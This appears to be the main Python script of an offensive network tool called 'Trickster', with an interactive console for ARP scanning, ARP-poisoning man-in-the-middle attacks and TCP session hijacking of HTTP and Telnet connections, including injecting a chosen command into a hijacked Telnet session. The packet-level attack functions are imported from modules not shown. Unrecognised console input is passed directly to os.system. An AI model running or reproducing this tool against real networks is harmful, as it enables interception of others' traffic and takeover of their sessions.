import os
import globals
from uuid import uuid4
from colorama import init, Fore, Style
from arp_poisoning import *
from tcp_hijacking import *

init()

BANNER = f'''{Fore.MAGENTA}

▄▄▄█████▓ ██▀███   ██▓ ▄████▄   ██ ▄█▀  ██████ ▄▄▄█████▓▓█████  ██▀███  
▓  ██▒ ▓▒▓██ ▒ ██▒▓██▒▒██▀ ▀█   ██▄█▒ ▒██    ▒ ▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒
▒ ▓██░ ▒░▓██ ░▄█ ▒▒██▒▒▓█    ▄ ▓███▄░ ░ ▓██▄   ▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒
░ ▓██▓ ░ ▒██▀▀█▄  ░██░▒▓▓▄ ▄██▒▓██ █▄   ▒   ██▒░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄  
  ▒██▒ ░ ░██▓ ▒██▒░██░▒ ▓███▀ ░▒██▒ █▄▒██████▒▒  ▒██▒ ░ ░▒████▒░██▓ ▒██▒
  ▒ ░░   ░ ▒▓ ░▒▓░░▓  ░ ░▒ ▒  ░▒ ▒▒ ▓▒▒ ▒▓▒ ▒ ░  ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░
    ░      ░▒ ░ ▒░ ▒ ░  ░  ▒   ░ ░▒ ▒░░ ░▒  ░ ░    ░     ░ ░  ░  ░▒ ░ ▒░
  ░        ░░   ░  ▒ ░░        ░ ░░ ░ ░  ░  ░    ░         ░     ░░   ░ 
            ░      ░  ░ ░      ░  ░         ░              ░  ░   ░     
                      ░                                                 
{Style.RESET_ALL}'''


class Attack:
    def __init__(self, iface):
        self.iface = iface
        self.ip = get_if_addr(self.iface)
        self.mac = get_if_hwaddr(self.iface)


class ArpScan(Attack):
    def __init__(self, rhosts, iface):
        self.rhosts = rhosts

        super().__init__(iface)

    def __call__(self):
        print(f'{Fore.GREEN}[+] Scanning {self.rhosts}...{Style.RESET_ALL}')

        result = arp_scan(self.rhosts, self.iface)
        ip_to_mac = {}

        for mapping in result:
            print(f'\t{mapping["IP"]} => {mapping["MAC"]}')

            ip_to_mac[mapping['IP']] = mapping['MAC']

    @staticmethod
    def get_params():
        return {'RHOSTS': ''}


class ArpPoisoning(Attack):
    def __init__(self, target, gateway, iface):
        self.target = target
        self.gateway = gateway

        super().__init__(iface)

    def recon(self):
        print(f'{Fore.GREEN}[+] Determining target and gateway MAC address.{Style.RESET_ALL}')

        result = arp_scan(self.target, self.iface)

        if not result:
            print(f'{Fore.YELLOW}\tCannot determine target MAC address. Are you sure the IP is correct?{Style.RESET_ALL}')

            exit(1)

        else:
            target_mac = result[0]['MAC']

        result = arp_scan(self.gateway, self.iface)

        if not result:
            print(f'{Fore.YELLOW}\tCannot determine gateway MAC address. Are you sure the IP is correct?{Style.RESET_ALL}')

            exit(1)

        else:
            gateway_mac = result[0]['MAC']

        globals.GATEWAY_MAC = gateway_mac
        globals._SRC_DST = {
            gateway_mac: target_mac,
            target_mac: gateway_mac
        }

        print(f'{Fore.GREEN}[+] Performing ARP poisoning MITM.{Style.RESET_ALL}')

        return target_mac, gateway_mac

    def __call__(self):
        target_mac, gateway_mac = self.recon()

        sniff_filter = f'ip and (ether src {target_mac} or ether src {gateway_mac})'

        arp_mitm(
            self.target, self.gateway, target_mac, gateway_mac, globals.MY_MAC,
            sniff_parser, sniff_filter, self.iface
        )

    @staticmethod
    def get_params():
        return {'TARGET': '', 'GATEWAY': ''}


class SessionHijacking(ArpPoisoning):
    def __init__(self, target, gateway, iface, proto, cmd=None):
        self.proto = proto
        self.cmd = cmd

        super().__init__(target, gateway, iface)

    def __call__(self):
        target_mac, gateway_mac = super().recon()

        if self.proto == 'http':
            globals.PROTO = 'http'

            sniff_filter = f'ip and tcp port 80 and ether src {target_mac}'

        elif self.proto == 'telnet':
            globals.PROTO = 'telnet'
            globals.CMD = self.cmd

            sniff_filter = f'ip and tcp port 23 and ether src {gateway_mac}'

        arp_mitm(
            self.target, self.gateway, target_mac, gateway_mac, globals.MY_MAC,
            hijack, sniff_filter, self.iface
        )

    @staticmethod
    def get_params():
        return {'TARGET': '', 'GATEWAY': '', 'PROTO': '', 'CMD': ''}


class CommandHandler:
    def __init__(self):
        self.iface = conf.iface
        self.attack = 'discover'
        self.attack_params = ArpScan.get_params()
        self.attacks = {
            'discover': ArpScan,
            'mitm': ArpPoisoning,
            'hijack': SessionHijacking
        }
        self.hijack_protocols = ('telnet', 'http')

    def print_parameters(self):
        print(f'{Fore.BLUE}{"-" * 32}{Style.RESET_ALL}')
        print(f'{Fore.BLUE}Basic Parameters:{Style.RESET_ALL}')
        print(f'\tIFACE => {self.iface}')
        print(f'\tATTACK => {self.attack}')
        print(f'{Fore.BLUE}Attack Parameters:{Style.RESET_ALL}')

        for param in self.attack_params:
            print(f'\t{param} => {self.attack_params[param]}')

        print(f'{Fore.BLUE}{"-" * 32}{Style.RESET_ALL}')

    def parse_cmd(self, cmd):
        if cmd.startswith('SET'):
            data = cmd.split()

            if len(data) < 3:
                raise ValueError('Expected: SET <key> <value>')

            key, value = data[1], ' '.join(data[2:])

            if key.lower() == 'iface':
                self.iface = value

                print(f'{Fore.GREEN}IFACE => {value}{Style.RESET_ALL}')
                globals.IFACE = self.iface
                globals.MY_MAC = get_if_hwaddr(globals.IFACE)
                globals.MY_IP = get_if_addr(globals.IFACE)

            elif key.lower() == 'attack':
                attack = value.lower()

                if attack in self.attacks:
                    self.attack = attack
                    self.attack_params = self.attacks[attack].get_params()

                    print(f'{Fore.GREEN}ATTACK => {attack}{Style.RESET_ALL}')

                else:
                    raise ValueError(f'Unrecognized attack {attack}')

            elif key.upper() in self.attack_params:
                if key.upper() == 'PROTO':
                    if value.lower() not in self.hijack_protocols:
                        raise ValueError(f'Unsupported hijack protocol: {value}')

                    elif value.lower() == 'http':
                        self.attack_params['CMD'] = 'Unused'

                    elif value.lower() == 'telnet':
                        self.attack_params['CMD'] = ''

                self.attack_params[key.upper()] = value

                print(f'{Fore.GREEN}{key.upper()} => {value}{Style.RESET_ALL}')

            else:
                raise ValueError(f'Unrecognized parameter: {key}')

        elif cmd == 'SHOW OPTIONS':
            self.print_parameters()

        elif cmd == 'EXPLOIT' or cmd == 'RUN':
            if '' in self.attack_params.values():
                empty_params = [param for param, val in self.attack_params.items() if val == '']

                raise ValueError(f'Empty parameters: {empty_params}')

            if self.attack == 'discover':
                attack = ArpScan(self.attack_params['RHOSTS'], self.iface)

            elif self.attack == 'mitm':
                attack = ArpPoisoning(
                    self.attack_params['TARGET'],
                    self.attack_params['GATEWAY'],
                    self.iface
                )

            elif self.attack == 'hijack':
                attack = SessionHijacking(
                    self.attack_params['TARGET'],
                    self.attack_params['GATEWAY'],
                    self.iface,
                    self.attack_params['PROTO'],
                    cmd=self.attack_params['CMD']
                )

            try:
                attack()
            except KeyboardInterrupt:
                print(f'{Fore.YELLOW}Detected keyboard interrupt, ending attack.{Style.RESET_ALL}')

        elif cmd == 'QUIT' or cmd == 'EXIT':
            return True

        else:
            os.system(cmd)

        return False

print(BANNER)

globals.IFACE = conf.iface
globals.MY_MAC = get_if_hwaddr(conf.iface)
globals.MY_IP = get_if_addr(conf.iface)

cmd_handler = CommandHandler()

while True:
    try:
        if cmd_handler.parse_cmd(input(f'{Fore.CYAN}[TRICKSTER] > {Style.RESET_ALL}')):
            break
    except KeyboardInterrupt:
        print(f'\n{Fore.YELLOW}Bye!{Style.RESET_ALL}')

        break
    except ValueError as e:
        print(f'{Fore.RED}{e}{Style.RESET_ALL}')
